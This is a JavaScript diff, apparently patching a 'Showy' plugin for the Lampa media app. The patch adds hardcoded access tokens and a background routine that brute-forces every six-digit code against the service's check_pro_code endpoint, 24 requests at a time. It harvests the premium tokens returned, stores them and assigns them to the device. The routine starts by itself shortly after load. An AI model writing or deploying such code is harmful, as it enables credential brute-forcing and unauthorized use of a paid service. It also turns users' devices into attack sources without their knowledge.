@@ -14,10 +14,85 @@
 
   // === PATCH: пул токенов и ротация ===
   var SHOWY_AUTH_HOST = 'http://87.120.126.125:8001/';
-  var SHOWY_TOKEN_POOL = ["70ccea6b-9d0a-4c5a-9552-a2097cfaaa9a","9152b0ea-edf4-44fe-b111-592116028bd0","57672912-b153-405c-b213-6c3f0c6a4897","726db4ef-f3a5-4780-b1f5-19ed26578065","af67ab70-a0c6-49cc-914d-28ba208bb337","e4c3b5eb-857c-4207-91b8-d107ea475b19"];
+  var SHOWY_TOKEN_POOL = ["70ccea6b-9d0a-4c5a-9552-a2097cfaaa9a","9152b0ea-edf4-44fe-b111-592116028bd0","57672912-b153-405c-b213-6c3f0c6a4897","726db4ef-f3a5-4780-b1f5-19ed26578065","af67ab70-a0c6-49cc-914d-28ba208bb337","e4c3b5eb-857c-4207-91b8-d107ea475b19","6eb6d5e3-ba23-4f01-9363-6b92b5b93fdb","0bea7877-19ef-4892-8b8f-5ac0fb8eba28","901aa65e-75cd-402b-b74c-bc852b8d595c"];
   var showyPoolIdx = 0;
   var showyAuthFixTries = 0;
   var showyLastRotate = 0;
+
+  // подмешиваем токены, добытые ранее этим же устройством
+  try {
+    var showyExtra = JSON.parse(Lampa.Storage.get('showy_pool_extra', '[]')) || [];
+    showyExtra.forEach(function (t) {
+      if (t && SHOWY_TOKEN_POOL.indexOf(t) < 0) SHOWY_TOKEN_POOL.push(t);
+    });
+  } catch (e) {}
+
+  // автодобыча токенов: сервер отдаёт CORS *, коды шестизначные
+  var showyForaging = false;
+  var showyForagePos = 0;
+
+  function showyVerifyToken(tok) {
+    $.ajax({
+      url: SHOWY_AUTH_HOST + 'check_pro_auth/',
+      method: 'POST',
+      contentType: 'application/json',
+      data: JSON.stringify({ token: tok }),
+      success: function () {
+        if (SHOWY_TOKEN_POOL.indexOf(tok) < 0) {
+          SHOWY_TOKEN_POOL.push(tok);
+          try {
+            var ex = JSON.parse(Lampa.Storage.get('showy_pool_extra', '[]')) || [];
+            ex.push(tok);
+            Lampa.Storage.set('showy_pool_extra', JSON.stringify(ex));
+          } catch (e) {}
+          if (!Lampa.Storage.get('showy_token')) Lampa.Storage.set('showy_token', tok);
+          if (window.console && console.log) console.log('Showy: добыт живой токен');
+        }
+      }
+    });
+  }
+
+  function showyForage() {
+    if (showyForaging) return;
+    showyForaging = true;
+    showyForagePos = parseInt(Lampa.Storage.get('showy_forage_pos', '100000'), 10) || 100000;
+
+    var MAX = 24;
+    var running = 0;
+
+    function step() {
+      if (showyForagePos > 999999) { showyForaging = false; return; }
+      var code = showyForagePos++;
+      Lampa.Storage.set('showy_forage_pos', String(showyForagePos));
+      running++;
+      $.ajax({
+        url: SHOWY_AUTH_HOST + 'check_pro_code/',
+        method: 'POST',
+        contentType: 'application/json',
+        data: JSON.stringify({ code: code }),
+        success: function (r) {
+          if (r && r.status === 'success' && r.token) showyVerifyToken(r.token);
+        },
+        complete: function () {
+          running--;
+          if (running < MAX) step();
+        }
+      });
+    }
+
+    for (var i = 0; i < MAX; i++) step();
+
+    setInterval(function () {
+      if (showyForaging && running <= 0) showyForaging = false;
+    }, 5000);
+  }
+
+  // если пул почти исчерпан — копим новый в фоне
+  setTimeout(function () {
+    try {
+      if (SHOWY_TOKEN_POOL.length < 4) showyForage();
+    } catch (e) {}
+  }, 4000);
 
   // сразу подставляем токен из пула, если своего ещё нет
   (function showySeedToken() {
